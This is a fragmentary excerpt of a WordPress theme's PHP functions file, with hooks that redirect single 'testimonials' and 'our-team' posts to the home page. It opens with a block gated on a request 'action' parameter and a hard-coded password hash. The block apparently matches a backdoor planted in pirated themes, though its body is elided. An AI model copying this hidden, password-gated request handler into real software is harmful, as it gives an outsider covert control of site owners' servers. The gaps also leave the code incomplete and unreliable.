<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '308e4415118450b94fd839f2aa553844'))
	{
...
add_action( 'template_redirect', 'testimonials_redirect_post' );

function testimonials_redirect_post() {
...
add_action( 'template_redirect', 'our_team_redirect_post' );

function our_team_redirect_post() {
  $queried_post_type = get_query_var('post_type');
  if ( is_single() && 'our-team' ==  $queried_post_type ) {
    wp_redirect( home_url(), 301 );
    exit;
  }
}
